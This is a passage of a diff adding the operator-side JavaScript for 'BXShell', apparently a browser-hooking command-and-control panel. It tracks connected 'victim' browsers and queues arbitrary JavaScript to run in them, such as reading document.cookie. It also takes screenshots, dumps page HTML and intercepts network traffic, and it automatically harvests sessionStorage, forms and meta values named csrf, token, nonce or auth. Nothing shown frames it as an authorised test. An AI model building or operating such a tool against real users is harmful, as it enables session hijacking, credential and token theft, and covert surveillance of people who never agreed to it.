+  if (p==="pl") renderPayloads();
+});
+
+/* ═══════════ Utils ═══════════ */
+function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+function nameOf(d,id){
+  return (d&&(d.names||{})[id]) || (vcache[id]&&vcache[id].name) || id.slice(0,8);
+}
+function secs(last){
+  if (!last) return 9999;
+  var t=last.split(":"), now=new Date();
+  return Math.max(0, Math.round((now-new Date(now.getFullYear(),now.getMonth(),now.getDate(),+t[0],+t[1],+t[2]))/1000));
+}
+function colorVal(v){
+  if (v==null||v===""||v==="undefined") return '<span class="v-undef">undefined</span>';
+  if (v==="null")                       return '<span class="v-null">null</span>';
+  if (v==="true"||v==="false")          return '<span class="v-bool">'+v+'</span>';
+  if (/^-?(\d+\.?\d*|\.?\d+)([eE][+-]?\d+)?$/.test(v)) return '<span class="v-num">'+esc(v)+'</span>';
+  if (v[0]==="{"||v[0]==="[")           return '<span class="v-obj">'+esc(v)+'</span>';
+  return '<span class="v-str">'+esc(v)+'</span>';
+}
+function stBadge(s){
+  if (!s||s==="DONE") return "";
+  var cls={QUEUED:"sb-Q",SENT:"sb-S",RECV:"sb-R"}[s]||"";
+  var lbl={QUEUED:"Queued",SENT:"Sent",RECV:"Recv"}[s]||s;
+  return '<span class="stbdg '+cls+'">'+lbl+'</span>';
+}
+/* Session status dot — live(green: beacon ≤5s) / stale(yellow: ≤35s, delayed) /
+   red(>35s & no SSE = fully disconnected) / dead(gray: closed session) */
+function sessDot(isClosed, last, sseCnt){
+  if (isClosed) return "dead";
+  var age=secs(last);
+  if ((sseCnt||0)>0) return age<5?"live":"stale";   // SSE alive → never fully disconnected
+  return age<=35?"stale":"red";                     // >35s silent & no SSE → offline
+}
+
+/* ═══════════ Console render ═══════════ */
+function renderConsole(entries){
+  var ft = cFilt.toLowerCase();
+  var html = "";
+  entries.forEach(function(e){
+    if (e.sep){ html += '<div class="grpsep">'+esc(e.text)+'</div>'; return; }
+    if (e.type==="slash"){
+      var r=e.r, icon=r.type==="screenshot"?"📸":"📄";
+      var sbody="";
+      if (r.status==="pending"||r.status==="loading"){
+        sbody='<span style="color:var(--dim)">'+icon+' Collecting…</span>';
+      } else if (r.type==="screenshot"&&r.status==="ok"&&r.data){
+        sbody='<img src="data:image/jpeg;base64,'+r.data+'" class="sshot-thumb" '
+          +'onclick="openLightbox(this.src)" style="max-height:100px;cursor:zoom-in;'
+          +'border:1px solid var(--border);border-radius:3px;vertical-align:top;margin-right:6px">'
+          +'<span style="color:var(--faint);font-size:10px">Click to view full size</span>';
+      } else if (r.type==="html"&&r.status==="ok"){
+        sbody='<a href="/api/htmldump?id='+esc(r.vid||"")+'" target="_blank" style="color:var(--blue)">📄 HTML dump — open page view →</a>';
+      } else {
+        sbody='<span style="color:var(--faint)">'+icon+' '+esc(r.msg||"Failed")+'</span>';
+      }
+      html+='<div class="ce"><span class="ico"><span>&nbsp;</span></span>'
+          +'<span class="bd">'+sbody+'</span></div>';
+      return;
+    }
+    if (e.type!=="cmd"&&e.type!=="result"){
+      var lk=e.type==="error"?"error":e.type==="warn"?"warn":e.type==="info"?"info":"log";
+      if (!cLv[lk]) return;
+    }
+    if (ft&&(e.rawText||"").toLowerCase().indexOf(ft)<0) return;
+
+    var rowCls = e.type==="error"?"ce-err":e.type==="warn"?"ce-warn":e.type==="info"?"ce-info":"";
+    var ico="&nbsp;";
+    if (e.type==="error")   ico='<span class="ico-err">⊗</span>';
+    else if(e.type==="warn")  ico='<span class="ico-warn">⚠</span>';
+    else if(e.type==="info")  ico='<span class="ico-info">ℹ</span>';
+    else if(e.type==="cmd")   ico='<span class="ico-prompt">›</span>';
+    else if(e.type==="result")ico='<span class="ico-ret">←</span>';
+
+    var body="";
+    if (e.type==="cmd"){
+      body='<span class="v-cmd">'+esc(e.text||"")+'</span>'+stBadge(e.state);
+    } else if(e.type==="result"){
+      body=e.isErr?'<span class="v-err">Uncaught '+esc(e.text||"")+'</span>':colorVal(e.text||"");
+    } else if(e.type==="pageinfo"){
+      body=esc(e.text||"");
+    } else {
+      body=esc(e.text||"");
+    }
+    html+='<div class="ce '+rowCls+'">'
+        +'<span class="ico">'+ico+'</span>'
+        +'<span class="bd">'+body+'</span>'
+        +'<span class="esrc">'+esc(e.src||"")+'</span>'
+        +'</div>';
+  });
+  if (!html) html='<div style="padding:12px 16px;color:var(--faint);font-size:11px">No messages</div>';
+  var stick=cscroll.scrollTop+cscroll.clientHeight>=cscroll.scrollHeight-40;
+  centries.innerHTML=html;
+  if (stick) cscroll.scrollTop=cscroll.scrollHeight;
+}
+
+/* ═══════════ Sessions render ═══════════ */
+function renderSessions(){
+  var allIds = Object.keys(vcache);
+  var tids = Object.keys(stateTrash);
+  if (!allIds.length && !tids.length){
+    hscroll.innerHTML='<div id="h-empty">No sessions — waiting for victim</div>';
+    return;
+  }
+  // active first, then closed sessions (each newest first)
+  allIds.sort(function(a,b){
+    var ca=vcache[a], cb=vcache[b];
+    if (!ca.closed && cb.closed) return -1;
+    if (ca.closed && !cb.closed) return 1;
+    var ta=ca.closed?(ca.closedAt||ca.last||""):(ca.last||"");
+    var tb=cb.closed?(cb.closedAt||cb.last||""):(cb.last||"");
+    return tb.localeCompare(ta);
+  });
+  var html = allIds.map(function(id){
+    var v=vcache[id];
+    var isClosed=v.closed;
+    var age=isClosed?null:secs(v.last);
+    var isLive=!isClosed&&age!==null&&age<=35;
+    var isSSE=(lastSSE[id]||0)>0;
+    var dotCls="hdot "+sessDot(isClosed, v.last, lastSSE[id]||0);
+    var timeStr=isClosed?(v.closedAt||v.last||""):(v.last||"");
+    var chHtml="";
+    if (!isClosed&&isLive){
+      chHtml=isSSE?'<span class="hch sse">SSE</span>':'<span class="hch">Polling</span>';
+    }
+    var tagHtml=isClosed?'<span class="hclosed-tag">Closed</span>'
+               :(v.isNew?'<span class="hnew-tag">NEW</span>':"");
+    return '<div class="hrow'+(id===active?" hrow-sel":"")+'" data-id="'+esc(id)+'">'
+      +'<span class="'+dotCls+'"></span>'
+      +'<div class="hinfo">'
+      +  '<div class="hname">'+esc(v.name||id.slice(0,8))+tagHtml+'</div>'
+      +  '<div class="hmeta">'+esc(v.url||"")+'</div>'
+      +'</div>'
+      +chHtml
+      +'<span class="htime">'+esc(timeStr)+'</span>'
+      +'<div class="hbtns">'
+      +'<button class="hreopenbtn" data-r="'+esc(id)+'">'+(isClosed?"Open →":"Console →")+'</button>'
+      +'<button class="hremovebtn" data-rem="'+esc(id)+'">Delete</button>'
+      +'</div>'
+      +'</div>';
+  }).join("");
+  // trash — soft-deleted sessions (restore/purge)
+  if (tids.length){
+    html += '<div class="htrash-hdr">TRASH ('+tids.length+') — Restore or Purge</div>'
+      + tids.map(function(id){
+          var t=stateTrash[id]||{};
+          return '<div class="hrow hrow-trash">'
+            +'<span class="hdot dead"></span>'
+            +'<div class="hinfo">'
+            +'<div class="hname">'+esc(t.name||id)+'</div>'
+            +'<div class="hmeta">'+esc((t.closed?"closed · ":"")+(t.last||""))+'</div>'
+            +'</div>'
+            +'<div class="hbtns">'
+            +'<button class="hrestorebtn" data-rs="'+esc(id)+'">Restore</button>'
+            +'<button class="hpurgebtn" data-pg="'+esc(id)+'">Purge</button>'
+            +'</div>'
+            +'</div>';
+        }).join("");
+  }
+  hscroll.innerHTML=html;
+  hscroll.querySelectorAll(".hrow").forEach(function(row){
+    row.addEventListener("click",function(e){
+      if (e.target.closest(".hbtns")) return;
+      openSession(this.dataset.id);
+    });
+  });
+  hscroll.querySelectorAll(".hreopenbtn").forEach(function(btn){
+    btn.addEventListener("click",function(e){
+      e.stopPropagation();
+      openSession(this.dataset.r);
+    });
+  });
+  hscroll.querySelectorAll(".hremovebtn").forEach(function(btn){
+    btn.addEventListener("click",function(e){
+      e.stopPropagation();
+      removeSession(this.dataset.rem);
+    });
+  });
+  hscroll.querySelectorAll(".hrestorebtn").forEach(function(btn){
+    btn.addEventListener("click",function(e){
+      e.stopPropagation();
+      var vid=this.dataset.rs;
+      suppressedVids.delete(vid);
+      fetch("/api/restore",{method:"POST",body:JSON.stringify({id:vid})})
+        .then(function(){ pollState(); }).catch(function(){});
+    });
+  });
+  hscroll.querySelectorAll(".hpurgebtn").forEach(function(btn){
+    btn.addEventListener("click",function(e){
+      e.stopPropagation();
+      var vid=this.dataset.pg;
+      var nm=(stateTrash[vid]&&stateTrash[vid].name)||vid;
+      if (!confirm("Purge ["+nm+"]?\nPermanently deletes the session directory — cannot be undone")) return;
+      fetch("/api/purge",{method:"POST",body:JSON.stringify({id:vid})})
+        .then(function(){ pollState(); }).catch(function(){});
+    });
+  });
+}
+
+function openSession(id){
+  if (vcache[id]) vcache[id].isNew=false;
+  hiddenTabs.delete(id);              // bring hidden tab back
+  suppressedVids.delete(id);          // allow re-listing after restore
+  active=id;
+  curPanel="c";
+  document.querySelectorAll(".ptab").forEach(function(x){ x.classList.toggle("on",x.dataset.p==="c"); });
+  document.querySelectorAll(".panel").forEach(function(x){ x.classList.remove("on"); });
+  $("cpanel").classList.add("on");
+  pollState();
+}
+
+function removeSession(id){
+  fetch("/api/delete",{method:"POST",body:JSON.stringify({id:id})}).catch(function(){});
+  suppressedVids.add(id);
+  delete vcache[id];
+  seenVids.delete(id);
+  if (active===id) active=null;
+  renderSessions();
+}
+
+/* ═══════════ Network render ═══════════ */
+function fmtSize(n){
+  n=+n||0; if (!n) return "";
+  if (n<1024) return n+"B";
+  if (n<1048576) return (n/1024).toFixed(1)+"KB";
+  return (n/1048576).toFixed(2)+"MB";
+}
+function prettyBody(b, ct){
+  if (!netPretty||!b) return b;
+  try { if ((ct||"").indexOf("json")>=0 || /^[\[{]/.test(b.trim()))
+    return JSON.stringify(JSON.parse(b), null, 2); } catch(e){}
+  return b;
+}
+function renderNet(){
+  var ft=netFilt.toLowerCase();
+  var rows=netRows.filter(function(r){
+    if (ft && (r.url||"").toLowerCase().indexOf(ft)<0 && (r.body||"").toLowerCase().indexOf(ft)<0) return false;
+    if (netMeth!=="ALL" && (r.method||"GET").toUpperCase()!==netMeth) return false;
+    if (netStat!=="ALL"){
+      var s=r.status||0;
+      if (netStat==="2" && !(s>=200&&s<300)) return false;
+      if (netStat==="3" && !(s>=300&&s<400)) return false;
+      if (netStat==="4" && !(s>=400 || s===0)) return false;
+    }
+    return true;
+  });
+  nbdg.textContent=rows.length; nbdg.className="bdg"+(rows.length?" show":"");
+  // dynamic method buttons — 실제 관측된 메소드 자동 노출 (WS◀/BEACON 등 포함)
+  var meths=["GET","POST"];
+  netRows.forEach(function(r){ var m=(r.method||"GET").toUpperCase(); if (meths.indexOf(m)<0) meths.push(m); });
+  if (netMeth!=="ALL" && meths.indexOf(netMeth)<0) netMeth="ALL";
+  $("nmethbtns").innerHTML=meths.map(function(m){
+    return '<button class="mbtn'+(m===netMeth?" on":"")+'" data-m="'+esc(m)+'">'+esc(m)+'</button>';
+  }).join("");
+  if (!rows.length){
+    ntbody.innerHTML='<tr id="n-empty"><td colspan="6">No network requests — waiting for fetch/XHR/resources/WS</td></tr>';
+    return;
+  }
+  var scCls=function(s,r){
+    if (r && r.ro && !s) return "sc-na";
+    s=s||0;
+    return s>=200&&s<300?"sc-ok":s>=300&&s<400?"sc-rd":s===0?"sc-na":"sc-er";
+  };
+  ntbody.innerHTML=rows.slice().reverse().map(function(r,i){
+    var ni=rows.length-1-i, exp=netExp.has(ni);
+    var mth=(r.method||"GET").toUpperCase();
+    var st=r.ro&&!r.status?"·":(r.status||"?");
+    return '<tr class="'+(exp?"nsel":"")+ '" data-ni="'+ni+'">'
+      +'<td class="nm nm-'+mth+'">'+esc(mth)+(r.ro?'<span class="ct-bdg">res</span>':'')+(r.ws?'<span class="ct-bdg">ws</span>':'')+'</td>'
+      +'<td class="sc '+scCls(r.status,r)+'">'+st+'</td>'
+      +'<td class="url-td" title="'+esc(r.url)+'">'+esc(r.url)+'</td>'
+      +'<td class="ms-td">'+fmtSize(r.size)+'</td>'
+      +'<td class="ms-td">'+(r.ms?r.ms+"ms":"")+'</td>'
+      +'<td style="text-align:center;color:var(--faint);font-size:9px">'+(exp?"▲":"▼")+'</td>'
+      +'</tr>'
+      +(exp?'<tr><td colspan="6" style="padding:0">'
+         +'<div class="ndet open">'
+         +'<div class="ndet-hdr">'+esc(mth)+' '+esc(r.url)+' — HTTP '+(r.status||"?")+''
+         +(r.ms?" · "+r.ms+"ms":"")+(r.size?" · "+fmtSize(r.size):"")+(r.ct?" · "+esc(r.ct):"")+'</div>'
+         +(r.err?'<div class="ndet-err">⚠ '+esc(r.err)+'</div>':'')
+         +((r.req_headers||r.req_body)
+            ?'<div class="ndet-sec">Request</div>'
+             +(r.req_headers?'<pre>'+esc(r.req_headers)+'</pre>':'')
+             +(r.req_body?'<pre>'+esc(r.req_body)+'</pre>':'')
+            :'')
+         +'<div class="ndet-sec">Response</div>'
+         +'<pre>'+esc(prettyBody(r.body||"(empty)", r.ct))+'</pre>'
+         +'<button class="ndet-pxbtn" data-pp="'+ni+'">'+(netPretty?"raw":"pretty")+'</button>'
+         +'<button class="ndet-pxbtn" data-pu="'+esc(r.url)+'">🔁 Proxy this URL</button>'
+         +'</div></td></tr>':'');
+  }).join("");
+  ntbody.onclick=function(e){
+    var ppb=e.target.closest("[data-pp]");
+    if (ppb){ netPretty=!netPretty; renderNet(); return; }
+    var pxl=e.target.closest("[data-pu]");
+    if (pxl){ openProxy(pxl.dataset.pu); return; }
+    var tr=e.target.closest("tr[data-ni]"); if (!tr) return;
+    var ni=+tr.dataset.ni;
+    if (netExp.has(ni)) netExp.delete(ni); else netExp.add(ni);
+    renderNet();
+  };
+}
+/* HAR 1.2 export — 캡처 데이터를 표준 포맷으로 다운로드 */
+function exportHAR(){
+  var iso=new Date().toISOString().slice(0,11);
+  var har={log:{version:"1.2",creator:{name:"BXShell",version:"0.3"},
+    entries:netRows.map(function(r){
+      return {
+        startedDateTime:iso+(r.t||"00:00:00")+"Z", time:r.ms||0,
+        request:{method:r.method||"GET",url:r.url,httpVersion:"HTTP/1.1",headers:[],
+                 queryString:[],cookies:[],headersSize:-1,bodySize:(r.req_body||"").length,
+                 postData:r.req_body?{mimeType:"text/plain",text:r.req_body}:undefined},
+        response:{status:r.status||0,statusText:"",httpVersion:"HTTP/1.1",headers:[],
+                  content:{size:(r.body||"").length,mimeType:r.ct||"application/octet-stream",text:r.body||""},
+                  redirectURL:"",headersSize:-1,bodySize:-1},
+        cache:{},timings:{send:0,wait:r.ms||0,receive:0}
+      };
+    })}};
+  var blob=new Blob([JSON.stringify(har,null,1)],{type:"application/json"});
+  var a=document.createElement("a");
+  a.href=URL.createObjectURL(blob);
+  a.download="bxshell_net_"+(active||"session")+".har";
+  a.click();
+  setTimeout(function(){ URL.revokeObjectURL(a.href); },1000);
+}
+
+/* ═══════════ pollState ═══════════ */
+function pollState(){
+  fetch("/api/state")
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      var vics=d.victims||{}, names=d.names||{}, closed=d.closed||[], sse=d.sse||{};
+
+      // vcache update
+      Object.keys(vics).forEach(function(id){
+        if (suppressedVids.has(id)) return;
+        var v=vics[id];
+        vcache[id]=vcache[id]||{};
+        vcache[id].name   = names[id]||v.name||id.slice(0,8);
+        vcache[id].url    = v.url||vcache[id].url||"";
+        vcache[id].last   = v.last||vcache[id].last||"";
+        vcache[id].closed = false;
+      });
+      closed.forEach(function(id){
+        if (suppressedVids.has(id)) return;
+        if (!vcache[id]) vcache[id]={name:names[id]||id.slice(0,8),url:"",last:"",closed:true};
+        if (!vcache[id].closedAt) vcache[id].closedAt=vcache[id].last||"";
+        vcache[id].closed=true;
+        if (names[id]) vcache[id].name=names[id];
+      });
+
+      // new victim detection (connected after the page was opened)
+      var isFirstLoad = !initialLoadDone;
+      initialLoadDone = true;
+      lastSSE = sse;
+      Object.keys(vics).forEach(function(id){
+        if (suppressedVids.has(id)) return;
+        if (!seenVids.has(id)){
+          seenVids.add(id);
+          if (!isFirstLoad){
+            vcache[id] = vcache[id] || {};
+            vcache[id].isNew = true;
+            // auto-select when nothing active + switch to Console
+            if (!active){
+              active = id;
+              curPanel = "c";
+              document.querySelectorAll(".ptab").forEach(function(x){ x.classList.toggle("on",x.dataset.p==="c"); });
+              document.querySelectorAll(".panel").forEach(function(x){ x.classList.remove("on"); });
+              $("cpanel").classList.add("on");
+            }
+            // flash Sessions badge
+            hbdg.classList.add("flash");
+            setTimeout(function(){ hbdg.classList.remove("flash"); }, 2200);
+          }
+        }
+      });
+      // network tab follows the session — switch detected → immediate reload
+      if (curPanel==="n" && active && active!==lastNetVid) loadNet();
+
+      // Sessions badge: total session count
+      var totalSessions = Object.keys(vcache).length;
+      hbdg.textContent = totalSessions || "";
+      hbdg.className = "bdg" + (totalSessions ? " show" : "");
+      if (curPanel==="h") renderSessions();
+
+      // session bar (active + viewed closed)
+      var sorted=Object.keys(vics).filter(function(id){ return !hiddenTabs.has(id); }).sort(function(a,b){
+        return (vics[b].last||"").localeCompare(vics[a].last||"");
+      });
+      var viewingClosed=active&&vcache[active]&&vcache[active].closed&&!vics[active];
+      if (!sorted.length&&!viewingClosed){
+        sbar.innerHTML="";
+        if (sbar_empty){ sbar.appendChild(sbar_empty); sbar_empty.style.display=""; }
+        active=null;
+      } else {
+        if (sbar_empty) sbar_empty.style.display="none";
+        if (!active||(!vics[active]&&!viewingClosed)) active=sorted[0];
+        var tabList=sorted.slice();
+        if (viewingClosed&&tabList.indexOf(active)<0) tabList.push(active);
+        sbar.innerHTML=tabList.map(function(id){
+          var isClosed=!vics[id]&&vcache[id]&&vcache[id].closed;
+          if (isClosed){
+            var vn=vcache[id];
+            return '<div class="stab'+(id===active?" on":"")+'" data-id="'+id+'">'
+              +'<span class="dot dead"></span>'
+              +'<span class="sname" title="'+esc(id)+'">'+esc(vn.name||id.slice(0,8))+'</span>'
+              +'<span class="sage">Closed</span>'
+              +'</div>';
+          }
+          var v=vics[id], sseCnt=sse[id]||0;
+          var on=sseCnt>0||secs(v.last)<=35;
+          var dc="dot "+sessDot(false, v.last, sseCnt);
+          return '<div class="stab'+(id===active?" on":"")+'" data-id="'+id+'">'
+            +'<span class="'+dc+'" title="last beacon '+secs(v.last)+'s ago"></span>'
+            +'<span class="sname" title="'+esc(id)+'">'+esc(nameOf(d,id))+'</span>'
+            +'<span class="sage">'+(on?secs(v.last)+"s":"×")+'</span>'
+            +'<span class="se" data-e="'+id+'">✎</span>'
+            +'<span class="sx" data-x="'+id+'">✕</span>'
+            +'</div>';
+        }).join("");
+        sbar.onclick=function(ev){
+          if (ev.target.dataset.x){
+            // tab ✕ = hide from console only — server session stays alive (beacons/queue),
+            // click the session in the Sessions panel to bring the tab back
+            var vid=ev.target.dataset.x;
+            hiddenTabs.add(vid);
+            if (active===vid) active=null;
+            pollState();
+            return;
+          }
+          if (ev.target.dataset.e){
+            var vid2=ev.target.dataset.e;
+            var nm2=prompt("Rename",nameOf(d,vid2));
+            if (nm2&&nm2.trim()){
+              if (vcache[vid2]) vcache[vid2].name=nm2.trim();
+              fetch("/api/rename",{method:"POST",body:JSON.stringify({id:vid2,name:nm2.trim()})}).then(pollState);
+            }
+            return;
+          }
+          var t=ev.target.closest(".stab");
+          if (t&&t.dataset.id){ active=t.dataset.id; pollState(); }
+        };
+      }
+
+      // meta pills + input bar state
+      if (!active){
+        connpill.textContent="—"; connpill.className="pill";
+        urlpill.textContent="—"; urlpill.title="";
+        cprompt.style.color="var(--faint)";
+        ccmd.placeholder="Waiting for victim…"; ccmd.disabled=true;
+        renderConsole([]); return;
+      }
+      // closed session read-only view
+      if (viewingClosed){
+        var vc2=vcache[active];
+        connpill.textContent="Disconnected"; connpill.className="pill";
+        urlpill.textContent=vc2.url||"—"; urlpill.title=vc2.url||"";
+        cprompt.style.color="var(--faint)";
+        ccmd.disabled=true; ccmd.placeholder="Disconnected — read only";
+        var entries=[]; errCnt=0;
+        var groups=[];
+        (d.commands||[]).filter(function(c){ return c.vid===active; }).forEach(function(c){
+          var crow=[{type:"cmd",text:c.code,src:c.t_queued,state:c.state,cid:c.cid,rawText:c.code}];
+          if (c.state==="DONE"){
+            if (c.err){ crow.push({type:"error",text:c.err,src:"VM",isErr:true,rawText:c.err}); errCnt++; }
+            else { crow.push({type:"result",text:c.out||"",isErr:false,rawText:c.out||""}); }
+          }
+          groups.push({t:c.t_done||c.t_queued||"", rows:crow});
+        });
+        ((d.console||{})[active]||[]).forEach(function(l){
+          var t=l.level==="error"?"error":l.level==="warn"?"warn":l.level==="info"?"info":"log";
+          if (t==="error") errCnt++;
+          groups.push({t:l.t||"", rows:[{type:t,text:l.text,src:"console",rawText:l.text}]});
+        });
+        groups.sort(function(a,b){ return (a.t||"").localeCompare(b.t||""); });
+        groups.forEach(function(g){ entries.push.apply(entries, g.rows); });
+        if (!entries.length) entries.push({sep:true,text:"— No records —"});
+        ebdg.textContent=errCnt; ebdg.className="bdg red"+(errCnt?" show":"");
+        renderConsole(entries); return;
+      }
+      if (!vics[active]){
+        connpill.textContent="—"; connpill.className="pill";
+        urlpill.textContent="—"; urlpill.title="";
+        cprompt.style.color="var(--faint)";
+        ccmd.placeholder="Waiting for victim…"; ccmd.disabled=true;
+        renderConsole([]); return;
+      }
+      var v2=vics[active], sse2=(sse[active]||0)>0, on2=sse2||secs(v2.last)<=35;
+      connpill.textContent=sse2?"SSE ●":(on2?"Polling "+secs(v2.last)+"s":"Offline "+secs(v2.last)+"s");
+      connpill.className="pill"+(sse2?" live":"");
+      urlpill.textContent=v2.url||"—"; urlpill.title=v2.url||"";
+      cprompt.style.color="var(--blue)";
+      ccmd.disabled=false;
+      ccmd.placeholder="document.cookie  ·  await bx.proxy('/api')  ·  bx.dom.text('h1')";
+
+      // console entries — 단일 시간순 스트림 (명령 → 결과 바로 아래 → 다음 명령)
+      var entries=[]; errCnt=0;
+      var groups=[];                                  // {t: 정렬 기준, rows: 표시 행들}
+
+      // auto-collect — 피해자 최초 연결 시점에 배치
+      var pi=(d.pageinfo||{})[active];
+      if (pi){
+        var prow=[], fv=d.victims[active]||{};
+        var piLine=pi.screen+(pi.viewport&&pi.viewport!==pi.screen?" / "+pi.viewport:"")
+          +" | "+esc(pi.lang||"")+" | "+esc(pi.platform||"");
+        prow.push({type:"pageinfo",text:piLine,src:"pageinfo",rawText:piLine});
+        if (pi.referrer) prow.push({type:"pageinfo",text:"referrer: "+pi.referrer,src:"pageinfo",rawText:pi.referrer});
+        if (pi.ss && pi.ss!=="{}" && pi.ss!=="null") prow.push({type:"pageinfo",text:"sessionStorage: "+pi.ss.slice(0,200),src:"SS",rawText:pi.ss});
+        var metaKeys=Object.keys(pi.meta||{}).filter(function(k){
+          var kl=k.toLowerCase(); return kl.indexOf("csrf")>=0||kl.indexOf("token")>=0||kl.indexOf("nonce")>=0||kl.indexOf("auth")>=0;
+        });
+        metaKeys.forEach(function(k){ prow.push({type:"info",text:k+": "+pi.meta[k],src:"meta",rawText:pi.meta[k]}); });
+        (pi.forms||[]).forEach(function(f){
+          var fs=f.fields.slice(0,6).map(function(x){ return x.name+(x.type&&x.type!=="text"?"["+x.type+"]":""); }).join(", ");
+          prow.push({type:"pageinfo",text:"form "+f.method.toUpperCase()+" "+f.action+" → "+fs,src:"form",rawText:fs});
+        });
+        groups.push({t:fv.first||"", rows:prow});
+      }
+
+      // commands — 슬래시 큰 뷰(썸네일/링크) 포함, 명령 바로 아래에 결과
+      var srMap={};
+      (slashResults[active]||[]).forEach(function(r){ if (r.cid) srMap[r.cid]=r; });
+      (d.commands||[]).filter(function(c){ return c.vid===active; }).forEach(function(c){
+        var sr=srMap[c.cid], disp=(sr&&sr.display)||c.code;
+        var crow=[{type:"cmd",text:disp,src:c.t_queued,state:c.state,cid:c.cid,rawText:disp}];
+        if (sr){
+          crow.push({type:"slash",r:sr,rawText:""});
+        } else if (c.state==="DONE"){
+          if (c.err){ crow.push({type:"error",text:c.err,src:"VM",isErr:true,rawText:c.err}); errCnt++; }
+          else { crow.push({type:"result",text:c.out||"",isErr:false,rawText:c.out||""}); }
+        }
+        groups.push({t:c.t_done||c.t_queued||"", rows:crow});
+      });
+      // cid 배정 전(전송 직후) 슬래시 결과 — 스트림 맨 아래
+      (slashResults[active]||[]).forEach(function(r){
+        if (!r.cid) groups.push({t:"99:99:99", rows:[{type:"slash",r:r,rawText:""}]});
+      });
+
+      // victim console — 발생 시각에 맞춰 스트림에 삽입
+      ((d.console||{})[active]||[]).forEach(function(l){
+        var t=l.level==="error"?"error":l.level==="warn"?"warn":l.level==="info"?"info":"log";
+        if (t==="error") errCnt++;
+        groups.push({t:l.t||"", rows:[{type:t,text:l.text,src:"console",rawText:l.text}]});
+      });
+
+      groups.sort(function(a,b){ return (a.t||"").localeCompare(b.t||""); });
+      groups.forEach(function(g){ entries.push.apply(entries, g.rows); });
+      // slash command results — auto-refresh pending items
+      var sr = slashResults[active] || [];
+      sr.forEach(function(r) {
+        if (r.status !== "pending") return;
+        r.polls = (r.polls||0) + 1;
+        if (r.type==="screenshot"){
+          var st=(d.shot_t||{})[active]||"";
+          if (st && st!==r.prevT && (d.has_screenshot||[]).indexOf(active)>=0){
+            r.status="loading";
+            fetch("/api/screenshot?id="+active).then(function(res){ return res.json(); }).then(function(s){
+              r.status=s.data?"ok":"error"; r.data=s.data||null; r.msg=s.data?"":"No data";
+            }).catch(function(){ r.status="error"; r.msg="Load failed"; });
+          } else if (r.polls > 30) { r.status="error"; r.msg="Timeout — victim may be offline"; }
+        } else if (r.type==="html"){
+          var ht=(d.html_t||{})[active]||"";
+          if (ht && ht!==r.prevT) { r.status="ok"; }
+          else if (r.polls > 30) { r.status="error"; r.msg="Timeout — victim may be offline"; }
+        }
+      });
+
+      ebdg.textContent=errCnt; ebdg.className="bdg red"+(errCnt?" show":"");
+      renderConsole(entries);
+    })
+    .catch(function(){});
+}
+
+/* ═══════════ Network load ═══════════ */
+var lastNetVid = null;   // network tab is currently bound to this session
+function loadNet(){
+  if (!active) return;
+  if (lastNetVid !== active){          // session switch — drop previous rows/expansions now
+    netRows=[]; netExp.clear(); lastNetVid=active;
+  }
+  fetch("/api/net?id="+active)
+    .then(function(r){ return r.json(); })
+    .then(function(rows){
+      if (lastNetVid!==active) return; // switched again while in flight — discard
+      netRows=rows||[]; renderNet();
+    })
+    .catch(function(){});
+}
+
+/* ═══════════ Console toolbar events ═══════════ */
+$("cfinp").addEventListener("input",function(){ cFilt=this.value; pollState(); });
+$("ctbar").addEventListener("click",function(e){
+  if (e.target.closest("#clrbtn")){ centries.innerHTML=""; errCnt=0; ebdg.className="bdg red"; return; }
+  var b=e.target.closest(".lvbtn");
+  if (b){
+    var lv=b.dataset.lv; cLv[lv]=!cLv[lv];
+    b.classList.toggle("on-e",lv==="error"&&cLv[lv]);
+    b.classList.toggle("on-w",lv==="warn"&&cLv[lv]);
+    b.classList.toggle("on-i",lv==="info"&&cLv[lv]);
+    b.classList.toggle("on-l",lv==="log"&&cLv[lv]);
+    pollState();
+  }
+});
+$("nfinp").addEventListener("input",function(){ netFilt=this.value; renderNet(); });
+$("ntbar").addEventListener("click",function(e){
+  if (e.target.closest("#nclrbtn")){
+    netRows=[]; netExp.clear(); netMeth="ALL"; renderNet();
+    if (active) fetch("/api/net/clear",{method:"POST",body:JSON.stringify({id:active})}).catch(function(){});
+    return;
+  }
+  if (e.target.closest("#npausebtn")){
+    netPaused=!netPaused;
+    $("npausebtn").textContent=netPaused?"▶":"⏸";
+    $("npausebtn").style.color=netPaused?"var(--red2)":"";
+    return;
+  }
+  if (e.target.closest("#nharbtn")){ exportHAR(); return; }
+  var mb=e.target.closest(".mbtn"); if (!mb) return;
+  if (mb.dataset.s!==undefined){
+    netStat=mb.dataset.s;
+    this.querySelectorAll(".mbtn[data-s]").forEach(function(x){ x.classList.toggle("on",x.dataset.s===netStat); });
+  } else if (mb.dataset.m!==undefined){
+    netMeth=mb.dataset.m;
+  }
+  renderNet();
+});
+$("hclrbtn").addEventListener("click",function(){
+  var total=Object.keys(vcache).length;
+  if (!total) return;
+  if (!confirm("Move all "+total+" session(s) to trash?\n(Sessions → TRASH: Restore or Purge)")) return;
+  Object.keys(vcache).forEach(function(id){
+    fetch("/api/delete",{method:"POST",body:JSON.stringify({id:id})}).catch(function(){});
+    suppressedVids.add(id);
+  });
+  vcache={}; seenVids.clear(); active=null;
+  renderSessions();
+});
+
+/* ═══════════ Command send ═══════════ */
+function appendErr(msg){
+  centries.innerHTML+='<div class="ce ce-err">'
+    +'<span class="ico"><span class="ico-err">⊗</span></span>'
+    +'<span class="bd"><span class="v-err">'+esc(msg)+'</span></span>'
+    +'</div>';
+  cscroll.scrollTop=cscroll.scrollHeight;
+}
+document.addEventListener("keydown",function(e){
+  if ((e.ctrlKey||e.metaKey)&&e.key==="l"){ e.preventDefault(); centries.innerHTML=""; }
+  if (e.key==="`"){ ccmd.focus(); e.preventDefault(); }
+});
+
+/* ═══════════ Slash commands ═══════════ */
+var SLASH = {
+  "/screenshot": function() {
+    if (!active) { appendErr("No victim session"); return; }
+    var vid = active;
+    slashResults[vid] = slashResults[vid] || [];
+    if (slashResults[vid].some(function(r){ return r.type==="screenshot"&&(r.status==="pending"||r.status==="loading"); })){
+      appendErr("Screenshot already in progress…"); return;
+    }
+    var r = {type:"screenshot", status:"pending", data:null, msg:"", polls:0, vid:vid, prevT:"", display:"/screenshot"};
+    slashResults[vid].push(r);
+    fetch("/api/state").then(function(res){ return res.json(); }).then(function(d){
+      r.prevT = (d.shot_t||{})[vid] || "";               // baseline to detect a fresh capture
+      return fetch("/api/send",{method:"POST",body:JSON.stringify({id:vid,cmd:"bx.shot()"})});
